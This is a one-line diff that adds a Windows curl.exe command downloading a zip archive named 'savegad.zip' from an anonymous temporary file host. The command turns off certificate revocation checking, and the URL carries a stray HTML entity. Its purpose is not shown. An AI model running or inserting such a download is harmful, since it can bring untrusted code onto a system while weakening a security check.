@@ -1,0 +1,3 @@
+curl.exe --ssl-no-revoke -L -o savegad.zip "https://tmpfiles.org/dl/whwBZgCqWniI/savegad.zip&quot"
+
+
